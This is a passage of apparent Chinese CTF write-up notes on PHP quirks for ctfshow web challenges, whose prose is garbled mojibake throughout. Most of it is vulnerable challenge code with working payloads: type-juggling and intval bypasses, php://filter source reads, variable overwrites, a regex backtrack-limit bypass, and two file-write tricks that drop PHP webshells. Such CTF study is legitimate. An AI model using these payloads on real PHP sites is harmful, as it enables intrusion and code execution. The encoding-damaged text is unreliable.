is_numericåœ¨PHP5ä¸­æ˜¯å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶çš„ï¼Œhex2binå‚æ•°ä¸èƒ½å¸¦0x å­—ç¬¦ä¸²å¯ä»¥è¢«is_numeric()å‡½æ•°è§£ææˆæ•°å­— 11ã€sha1æ¯”è¾ƒç¼ºé™·web104sha1æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚ä¸‹å¯ä½¿ç”¨a[]1b[]1æ•°ç»„ç»•è¿‡ if($a==$b) if(sha1($a)==sha1($b)) echo $flag; ä½†MD5æˆ–è€…sha1è¿™ç§å¦‚æœå¼ºåˆ¶ç±»å‹è½¬æ¢åï¼Œå°±ä¸æ¥å—æ•°ç»„äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æ‰¾çœŸæ­£çš„ç¼–ç åç›¸åŒçš„äº†ï¼Œå¦‚ aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 12ã€PHPåŒ$ï¼ˆ$$ï¼‰çš„å˜é‡è¦†ç›–åœ¨åŒå†™$çš„æ—¶å€™ï¼Œå±äºåŠ¨æ€å˜é‡ï¼Œå°±æ˜¯åé¢çš„å˜é‡å€¼ä½œä¸ºæ–°çš„å˜é‡å $test=a23; $testç­‰äºa23$$test=456; $$testä¹Ÿå°±ç­‰äº$a23,è¿™é‡Œç›¸å½“äºç»™$a23èµ‹å€¼äº†echo $test; æ­£å¸¸è¾“å‡º$testä¸ºa23echo $$test; è¿™é‡Œè¾“å‡º$$testï¼Œå°±æ˜¯$a23ï¼Œä¸º456echo $a23; ç¬¬äºŒè¡Œç»™$a23èµ‹å€¼äº†ï¼Œè¿™é‡Œæ­£å¸¸è¾“å‡º 13ã€parse_strå‡½æ•°çš„ä½¿ç”¨parse_strä¼šæŠŠå­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¼ å…¥çš„å¤šä¸ªå€¼ $a=q=123p=456;parse_str($a); //æ²¡æœ‰æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå­˜å‚¨è§£æç»“æœçš„æ•°ç»„ï¼‰ï¼Œæ‰€ä»¥è§£æåçš„é”®å€¼å¯¹å°†ä¼šä»¥ç›¸åº”çš„å˜é‡å½¢å¼å­˜åœ¨echo $q; è¾“å‡º123echo $p; è¾“å‡º456parse_str($a,$b); ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæ•°ç»„ï¼Œè§£æçš„å˜é‡éƒ½å­˜å…¥è¿™ä¸ªæ•°ç»„ä¸­echo $b[q]; è¾“å‡º123echo $b[p]; è¾“å‡º456 php8ç‰ˆæœ¬å¿…é¡»è¦æœ‰ç¬¬äºŒä¸ªå‚æ•°ï¼Œphp7ä¸å½±å“ä½¿ç”¨ä½†ä¼šè­¦å‘Šä¸€ä¸‹ 14ã€ereg %00æ­£åˆ™æˆªæ–­web108ereg PHP5.3åºŸå¼ƒäº†ï¼ŒåŠŸèƒ½å¯ä»¥ç”±preg_matchä»£æ›¿ï¼Œeregæœ‰ä¸ªæˆªæ–­æ¼æ´ï¼Œå­—ç¬¦ä¸²é‡ŒåŒ…æ‹¬%00å°±åªåŒ¹é…%00ä¹‹å‰çš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥å‰é¢æ ¹æ®æ­£åˆ™æ”¹ï¼Œåé¢æ˜¯æ‰§è¡Œè¯­å¥ï¼Œå¦‚æœæœ‰strrev() è¿™ç§å­—ç¬¦ä¸²åè½¬å‡½æ•°é…åˆç”¨æ›´å¥½ã€‚ ?phphighlight_file(__FILE__);error_reporting(0);include(flag.php);if (ereg (^[a-zA-Z]+$, $_GET[c])===FALSE) die(error);//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flagif(intval(strrev($_GET[c]))==0x36d) echo $flag;? payloadï¼š?c=w%00778 15ã€è¿­ä»£å™¨è·å–å½“å‰ç›®å½•(getcwd())web109web110FilesystemIteratorå¯ä»¥è·å¾—æ–‡ä»¶ç›®å½•ï¼Œå‚æ•°éœ€è¦ . æˆ–è€…å…·ä½“è·¯å¾„ï¼Œ**getcwd()**è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–å½“å‰æ–‡ä»¶è·¯å¾„ï¼ŒäºŒè€…åœ¨ä¸€å®šæ¡ä»¶ä¸‹é…åˆä½¿ç”¨è¾ƒå¥½ ?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[v1]) isset($_GET[v2])) $v1 = $_GET[v1]; $v2 = $_GET[v2]; if(preg_match(/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\|\\[|\\;|\\:|\\|\\|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/, $v1)) die(error v1); if(preg_match(/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\|\\[|\\;|\\:|\\|\\|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/, $v2)) die(error v2); eval(echo new $v1($v2()););? payloadï¼š?v1=FilesystemIteratorv2=getcwd 16ã€$GLOBALSå…¨å±€å˜é‡çš„ä½¿ç”¨web111$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ æ„é€ å‡ºvar_dump($GLOBALS);å¯ä»¥è¾“å‡ºå…¨éƒ¨å˜é‡å€¼ï¼ŒåŒ…æ‹¬è‡ªå®šä¹‰ ?phphighlight_file(__FILE__);error_reporting(0);include(flag.php);function getFlag($v1,$v2) eval($$v1 = $$v2;); var_dump($$v1);if(isset($_GET[v1]) isset($_GET[v2])) $v1 = $_GET[v1]; $v2 = $_GET[v2]; if(preg_match(/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\|\\[|\\;|\\:|\\|\\|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\|\\/, $v1)) die(error v1); if(preg_match(/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\|\\[|\\;|\\:|\\|\\|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\|\\/, $v2)) die(error v2); if(preg_match(/ctfshow/, $v1)) getFlag($v1,$v2); ? $$v1 = $$v2;ï¼šåœ¨è¿™å¥ä»£ç ä¸­ï¼Œ$v1å’Œ$v2çš„å€¼æ˜¯ä¸€ä¸ªå˜é‡åï¼Œç„¶åå³ä¾§å˜é‡çš„å€¼ä¼šèµ‹å€¼ç»™å·¦ä¾§å˜é‡ æŒ‰ç…§æˆ‘ä»¬æ‰€æŒæ¡çš„ï¼Œ$v1å¯ä»¥æ˜¯ä»»æ„å€¼ï¼Œæ‰€ä»¥æ„é€ playloadä¸ºï¼š?v1=ctfshowv2=GLOBALSï¼Œæœ€åå¾—åˆ°äº†æ‰€æœ‰å˜é‡çš„å€¼ï¼Œç„¶åå¯ä»¥çœ‹åˆ°flagå…¶å®å°±æ˜¯å˜é‡flagçš„å€¼ 17ã€phpä¼ªåè®®ç»•è¿‡is_fileï¼›highlight_fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨web112web114is_fileåˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”ç±»å‹ã€‚is_fileä¼šè®¤ä¸ºphpä¼ªåè®®ä¸æ˜¯æ–‡ä»¶ã€‚ä½†highlight_fileè®¤ä¸ºä¼ªåè®®å¯ä»¥æ˜¯æ–‡ä»¶ã€‚ if(! is_file($file)) highlight_file($file);else echo hacker!; å¦‚ä¸Šçš„ä»£ç ï¼Œå¯ä»¥ä¼ å…¥phpä¼ªåè®®è¿›è¡Œç»•è¿‡å¹¶ä¸”æ˜¾ç¤ºå«æœ‰flagçš„æ–‡ä»¶ã€‚è‹¥æœ‰è¿‡æ»¤ï¼Œå¯ä»¥æ¢å…¶ä»–ä¼ªåè®®æˆ–æ”¹ç¼–ç æ–¹å¼ ?phphighlight_file(__FILE__);error_reporting(0);function filter($file) if(preg_match(/\\.\\.\\/|http|https|data|input|rot13|base64|string/i,$file)) die(hacker!); else return $file; $file=$_GET[file];if(! is_file($file)) highlight_file(filter($file));else echo hacker!; æœ¬é¢˜é¢˜ç›®è¿‡æ»¤æ‰äº†ä¸€éƒ¨åˆ†çš„è¿‡æ»¤å™¨ï¼Œä½†æ˜¯è¿˜æœ‰è®¸å¤šå…¶ä»–è¿‡æ»¤å™¨å¯ä»¥ä½¿ç”¨ï¼Œå½“ç„¶æœ¬é¢˜æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸é€‚ç”¨è¿‡æ»¤å™¨ payloadä¸ºï¼š?file=php://filter/resource=flag.php 18ã€å¤šå†™æ ¹ç›®å½•ç»•è¿‡is_fileweb113åœ¨linuxä¸­procselfrootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ls procselfrootï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹ è¿™åˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡ºï¼š åŸç†ï¼šprocselfrootä»£è¡¨æ ¹ç›®å½•ï¼Œè¿›è¡Œç›®å½•æº¢å‡ºï¼Œè¶…è¿‡is_fileèƒ½å¤„ç†çš„æœ€å¤§é•¿åº¦å°±ä¸è®¤ä¸ºæ˜¯ä¸ªæ–‡ä»¶äº† å¦‚ä¸Šé¢çš„ä»£ç ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢payloadä»£æ›¿ file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php è¿™ä¸ªæŒ‰ç†è¯´ä¹Ÿæ˜¯æ–‡ä»¶çš„ï¼Œä½†is_fileè®¤ä¸ºä¸æ˜¯ 19ã€trimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡web115è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·æ£€æµ‹æ—¶ï¼Œis_numericè®¤ä¸ºå†…å®¹é‡Œæœ‰%09 %0a %0b %0c %0d %20ä¹Ÿç®—æ•°å­—ï¼Œè·Ÿtrimä¸€èµ·æµ‹è¯•ä¸€ä¸‹ for ($i=0; $i =128 ; $i++) $x=chr($i).1; if(trim($x)!==1 is_numeric($x)) echo urlencode(chr($i)). ; é™¤äº†+-.å·ä»¥å¤–è¿˜æœ‰åªå‰©ä¸‹%0cä¹Ÿå°±æ˜¯æ¢é¡µç¬¦äº†ï¼Œtrimé»˜è®¤æ—¶æ²¡æœ‰å‰”é™¤%0cã€‚å½¢å¦‚ä»¥ä¸‹ä»£ç å¯ä»¥ç»•è¿‡ if(is_numeric($num) and $num!==36 and trim($num)!==36) if($num==36) echo $flag; else echo hacker!!; payload:num=%0c36 20ã€ç»•è¿‡æ­»äº¡dieï¼ˆåˆ©ç”¨è¿‡æ»¤å™¨UCS-2LE UCS-2BEï¼‰function filter($x) if(preg_match(/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i,$x)) die(too young too simple sometimes naive!); $file=$_GET[file];$contents=$_POST[contents];filter($file);file_put_contents($file, ?php die();?.$contents); è¿™é“çœ‹äº†ç¾½å¸ˆå‚…wpï¼Œè¿‡æ»¤äº†è®¸å¤šåè®®ï¼Œè¿™æ˜¯å–ä¸€ä¸ª UCS-2LE UCS-2BE payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phppost:contents=?hp pvela$(P_SO[T]1;)? è¿™ä¼šå°†å­—ç¬¦ä¸¤ä½ä¸¤ä½äº¤æ¢ï¼Œfile_put_contentsåœ¨å†™å…¥çš„æ—¶å€™ä¼šç ´åé‚£å¥dieï¼Œä½†contentsé‚£å¥æ¢å¤åŸè²Œï¼Œå¯ä»¥æ‰§è¡Œ 21ã€é€šè¿‡å†…ç½®bashå‘½ä»¤æ„é€ å‘½ä»¤åœ¨è®¸å¤šå‘½ä»¤è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä¸€ä¸ªå­—æ¯ä¸€ä¸ªå­—æ¯å¾—æ„é€ ï¼Œè€Œè¿™äº›å­—æ¯ä»å†…ç½®å˜é‡é‡Œé¢æˆªï¼Œæ¯”å¦‚æ„é€ nlï¼Œå¯ä»¥å†™ä¸ºä¸‹é¢è¿™ç§æ–¹å¼ $PATH:14:1$PATH:5:1 åœ¨linuxä¸­å¯ä»¥ç”¨~è·å–å˜é‡çš„æœ€åå‡ ä½ï¼Œä¹Ÿå¯ä»¥å†™ä¸º$PATH:~0$PWD:~0ï¼Œå­—æ¯ä¸0ä½œç”¨ä¸€æ ·ï¼Œ$PATH:~A$PWD:~Aä¹Ÿæ˜¯nlï¼Œflag.phpä¹Ÿè¿‡æ»¤äº†çš„è¯å¯ä»¥ç”¨????.???ï¼Œå…·ä½“æƒ…å†µï¼Œå…·ä½“å¯¹å¾… 22ã€PHPå˜é‡åéæ³•å­—ç¬¦web123æ¯”å¦‚ä¼ å…¥AA_BB.CCè¿™ä¸ªå˜é‡ï¼ŒPHPæ˜¯ä¸å…è®¸å˜é‡åä¸­å«æœ‰. çš„ï¼Œä¼šé»˜è®¤å°†ä¸åˆæ³•å­—ç¬¦æ›¿æ¢ä¸º_,å¦‚ä¸‹ï¼š ?php var_dump($_POST);? ä¼ å€¼ï¼šAA.BB.CC=14è¾“å‡ºï¼šarray(1) [AA_BB_CC]= string(2) 14 ä½†è¾“å…¥AA[BB.CCå®ƒå°±åªæ›¿æ¢ [ è¾“å‡º array(1) { [â€œAA_BB.CCâ€] string(2) â€œ14â€ } ?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);$a=$_SERVER[argv];$c=$_POST[fun];if(isset($_POST[CTF_SHOW])isset($_POST[CTF_SHOW.COM])!isset($_GET[fl0g])) if(!preg_match(/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\|\\|\\|\\|\\,|\\.|\\;|\\?/, $c)$c=18) eval($c.;); if($fl0g===flag_give_me) echo $flag; ? è¿™é¢˜postä¼ è¿›å»çš„å˜é‡CTF_SHOWå’Œå˜é‡CTF_SHOW.COMéƒ½ä¸èƒ½ä¸ºç©ºï¼Œç„¶åå˜é‡fl0gä¸ºç©ºæ‰èƒ½å¤Ÿæ»¡è¶³æ¡ä»¶ ä½†æ˜¯å˜é‡åCTF_SHOW.COMä¸­æœ‰éæ³•å­—ç¬¦ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥æ„é€ çš„payloadä¸ºï¼šCTF_SHOW=1CTF[SHOW.COM=1fun=echo $flag 23ã€gettextæ‹“å±•çš„ä½¿ç”¨var_dump(call_user_func($f1,$f2)); å¦‚ä»¥ä¸Šä»£ç ï¼Œå¤šé‡è¿‡æ»¤åï¼Œf1å¯ä»¥ä¸ºgettextï¼Œf2å¯ä»¥ä¸ºphpinfoï¼Œå¦‚æœè¿‡æ»¤æ›´ä¸ºä¸¥æ ¼ï¼Œæ›´æ”¹iniæ–‡ä»¶é‡Œçš„æ‹“å±•åï¼Œ _() ç­‰æ•ˆäº gettext() ?phpecho gettext(phpinfo);ç»“æœ phpinfoecho _(phpinfo);ç»“æœ phpinfo 24ã€æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limitå›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚ ä¹Ÿå°±æ˜¯è¯´å‰é¢100ä¸‡ä¸ªå­—æ¯ï¼Œåé¢æ˜¯è¯­å¥å°±å¥½ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­ if(preg_match(/.+?ABC/is, $f)) die(bye!); if(stripos($f, ABC) === FALSE) die(bye!!); echo $flag; å‰é¢100ä¸‡ä¸ªå­—æ¯åé¢ABCå°±å¯ä»¥echo $flag 25ã€è°ƒç”¨ç±»ä¸­çš„å‡½æ•°-ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³• ä¹Ÿå°±æ˜¯è¯´åŒå†’å·ä¸ç”¨å®ä¾‹åŒ–ç±»å°±å¯ä»¥è°ƒç”¨ç±»ä¸­çš„é™æ€æ–¹æ³• class ctfshow function __wakeup() die(private class); static function getFlag() echo file_get_contents(flag.php); call_user_func($_POST[ctfshow]); è¿™ä¸ªä¼ å…¥ctfshowctfshow::getFlagå³å¯ 26ã€returnç»•è¿‡eval(return 1;phpinfo(););ä¼šå‘ç°æ˜¯æ— æ³•æ‰§è¡Œphpinfo()çš„ï¼Œä½†æ˜¯phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ é¢˜ç›®web89include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if(preg_match(/[0-9]/, $num)) die(no no no!); if(intval($num)) echo $flag; preg_matchå½“æ£€æµ‹çš„å˜é‡æ˜¯æ•°ç»„çš„æ—¶å€™ä¼šæŠ¥é”™å¹¶è¿”å›0ã€‚è€Œintvalå‡½æ•°å½“ä¼ å…¥çš„å˜é‡ä¹Ÿæ˜¯æ•°ç»„çš„æ—¶å€™ï¼Œä¼šè¿”å›1ï¼›æ‰€ä»¥å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡ web90(intval)include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num===4476) die(no no no!); if(intval($num,0)===4476) echo $flag; else echo intval($num,0); payloadï¼š?num=4476.0 web92(intval)include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num==4476) die(no no no!); if(intval($num,0)==4476) echo $flag; else echo intval($num,0); ç”±äº $num==4476æ˜¯å¼±æ¯”è¾ƒï¼Œå¯¹äºç±»å‹ä¸çœ‹é‡ï¼Œåªè¦æœ€åçš„å€¼æ˜¯ä¸€æ ·çš„å°±è¡Œï¼Œæ‰€ä»¥ä¹‹å‰çš„ç§‘å­¦è®¡æ•°æ³•ä»€ä¹ˆçš„éƒ½ä¸èƒ½å¤ŸæˆåŠŸç»•è¿‡ï¼Œæ‰€ä»¥éœ€è¦æŠŠ4476è½¬ä¸º8è¿›åˆ¶ç­‰å…¶ä»–è¿›åˆ¶çš„æ•°å­—æ¥ç»•è¿‡ web93(intval)include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num==4476) die(no no no!); if(preg_match(/[a-z]/i, $num)) die(no no no!); if(intval($num,0)==4476) echo $flag; else echo intval($num,0); å…«è¿›åˆ¶ç»•è¿‡ï¼š?num=010574 web94(intval)include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num===4476) die(no no no!); if(preg_match(/[a-z]/i, $num)) die(no no no!); if(!strpos($num, 0)) die(no no no!); if(intval($num,0)===4476) echo $flag; strposå‡½æ•°æ˜¯PHPä¸­ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°æŒ‡å®šå­å­—ç¬¦ä¸²çš„ä½ç½®çš„å‡½æ•°ã€‚ strpos($num, 0)ï¼š $numæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæƒ³è¦æŸ¥æ‰¾çš„å­å­—ç¬¦ä¸²æ˜¯ â€œ0â€ é¢˜ç›®é‡Œè¦æ±‚è¾“å…¥çš„å†…å®¹é‡Œé¢å¿…é¡»åŒ…å«0ï¼Œå¹¶ä¸”ä¸åŒ…å«å­—æ¯ï¼Œä¸èƒ½å¼ºç­‰äº4476ï¼Œåœ¨ç»è¿‡intvalå‡½æ•°åè¿˜è¦ç­‰äº4476ï¼Œæ‰€ä»¥payloadï¼šnum=4476.0 web95(intval)include(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num==4476) die(no no no!); if(preg_match(/[a-z]|\\./i, $num)) die(no no no!!); if(!strpos($num, 0)) die(no no no!!!); if(intval($num,0)===4476) echo $flag; å¯ä»¥é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡ï¼Œä½†æ˜¯å‰é¢å¿…é¡»å¤šåŠ ä¸€ä¸ªå­—èŠ‚ï¼š?num=+010574 web97(md5)include(flag.php);highlight_file(__FILE__);if (isset($_POST[a]) and isset($_POST[b])) if ($_POST[a] != $_POST[b]) if (md5($_POST[a]) === md5($_POST[b])) echo $flag; else print Wrong.;? æ•°ç»„ç»•è¿‡ï¼ša[]=1b[]=2 web100?phphighlight_file(__FILE__);include(ctfshow.php);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[v1];$v2=$_GET[v2];$v3=$_GET[v3];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0) if(!preg_match(/\\;/, $v2)) if(preg_match(/\\;/, $v3)) eval($v2(ctfshow)$v3); ? is_numeric()å‡½æ•°ç”¨äºåˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å¦‚æœå˜é‡æ˜¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› false åœ¨PHPä¸­ï¼Œé€»è¾‘è¿ç®—ç¬¦andä¼šæ¯”=çš„ä¼˜å…ˆçº§ä½ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œ=ä¼šå…ˆæ‰§è¡Œï¼Œç„¶åæ‰æ˜¯andï¼Œæ‰€ä»¥å½“å…¶ä¸­ä¸€ä¸ªä¸ºæ•°å­—ï¼Œå¦å¤–ä¸¤ä¸ªä¸æ˜¯æ•°å­—æ—¶ï¼Œ$v0çš„å€¼å°†å–å†³äºç¬¬ä¸€ä¸ªæ¡ä»¶çš„ç»“æœï¼Œå› ä¸ºé€»è¾‘è¿ç®—ç¬¦andä¼šè¢«è§†ä¸ºæœ€åä¸€ä¸ªæ“ä½œç¬¦ã€‚å› æ­¤ï¼Œ$v0å°†è¢«èµ‹å€¼ä¸ºç¬¬ä¸€ä¸ªæ¡ä»¶çš„ç»“æœï¼Œè€Œä¸ä¼šè€ƒè™‘åç»­æ¡ä»¶ã€‚ payloadï¼š?v1=1v2=var_dump($ctfshow)v3=/**/; web102?phphighlight_file(__FILE__);$v1 = $_POST[v1];$v2 = $_GET[v2];$v3 = $_GET[v3];$v4 = is_numeric($v2) and is_numeric($v3);if($v4) $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);else die(hacker);? call_user_func() è°ƒç”¨æ–¹æ³•æˆ–å˜é‡,ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å¯¹è±¡çš„å‚æ•° file_put_contents() ç”¨æ¥å†™æ–‡ä»¶è¿›å»ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯éœ€è¦å†™è¿›æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œæ–‡ä»¶åæ”¯æŒä¼ªåè®® payloadï¼š å‚æ•°åˆ†æï¼š v1æ˜¯è°ƒç”¨æ–¹æ³•v2æ˜¯æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸”æ˜¯å†™è¿›æ–‡ä»¶ä¸­çš„å†…å®¹ v3æ˜¯æ–‡ä»¶åï¼ˆå¯é€šè¿‡ä¼ªåè®®æ¥åˆ›å»ºï¼‰ v3php://filter/write=convert.base64-decode/resource=2.php v2:å†™è¿›2.phpçš„å†…å®¹ â€”â€” æŸ¥çœ‹å½“å‰é¡µé¢æºç ï¼›?cat *; â€”â€” è½¬ä¸ºbase64ä¸ºPD89YGNhdCAqYDs â€”â€”è½¬ä¸º16è¿›åˆ¶çš„asciiç ä¸º5044383959474e6864434171594473â€”â€”ç»•è¿‡æˆªæ–­ï¼Œåœ¨å‰é¢éšæ„åŠ ä¸¤ä½æ•°å­—225044383959474e6864434171594473 v1ï¼šå°†æ•°å­—å­—ç¬¦ä¸²è¿˜åŸä¸ºbase64ç  â€”â€” hex2bin æœ€ç»ˆpayloadï¼š v1=hex2bin v2=225044383959474e6864434171594473 v3=php://filter/write=convert.base64-decode/resource=2.php web105?phphighlight_file(__FILE__);include(flag.php);error_reporting(0);$error=ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ;$suces=æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼;foreach($_GET as $key = $value) if($key===error) die(what are you doing?!); $$key=$$value;foreach($_POST as $key = $value) if($value===flag) die(what are you doing?!); $$key=$$value;if(!($_POST[flag]==$flag)) die($error);echo your are good.$flag. ;die($suces);? payloadï¼š?suces=flagï¼›postï¼šerror=suces $key=suces,$suces=$flag,$error=$suces=$flag web107?phphighlight_file(__FILE__);error_reporting(0);include(flag.php);if(isset($_POST[v1])) $v1 = $_POST[v1]; $v3 = $_GET[v3]; parse_str($v1,$v2); if($v2[flag]==md5($v3)) echo $flag; ? payloadï¼šget:?v3=0ï¼›post:v1=flag=cfcd208495d565ef66e7dff9f98764da web125?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);$a=$_SERVER[argv];$c=$_POST[fun];if(isset($_POST[CTF_SHOW])isset($_POST[CTF_SHOW.COM])!isset($_GET[fl0g])) if(!preg_match(/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\|\\|\\|\\|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i, $c)$c=16) eval($c.;); if($fl0g===flag_give_me) echo $flag; ? ä¸ä¸Šä¸€é¢˜ç›¸æ¯”å¤šç¦æ­¢flag|GLOBALS|echo|var_dump|printï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ¢ä¸€ç§æ€è·¯ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨includeå‡½æ•°æ¥åŒ…å«flag.php å› æ­¤æˆ‘ä»¬postä¼ å‚ï¼šCTF_SHOW=1CTF[SHOW.COM=1fun=include$_GET[1]ï¼Œgetä¼ å‚ï¼š?1=php://filter/convert.base64-encode/resource=flag.php å¾—åˆ°base64ç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œæ‹¿å»è§£å¯†åå°±å¯ä»¥å¾—åˆ°flagäº† å¼•ç”¨æ¥æº: Tajangçš„å¤§åƒä¸–ç•Œæ–‡ç« ä½œè€…: Tajangæ–‡ç« é“¾æ¥: https://ctfking.com/2021/07/14/php-te-xing-zong-jie/","tags":["php"],"categories":["CTF"]},{"title":"phpååºåˆ—åŒ–å­¦ä¹ ","path":"/2024/02/16/phpååºåˆ—åŒ–å­¦ä¹ _max/phpååºåˆ—åŒ–å­¦ä¹ /","content":"åŸºç¡€ç†è§£PHPåºåˆ—åŒ–ï¼šserialize() åºåˆ—åŒ–æ˜¯å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚ è€ŒPHPååºåˆ—åŒ–ï¼šunserialize() ååºåˆ—åŒ–æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ 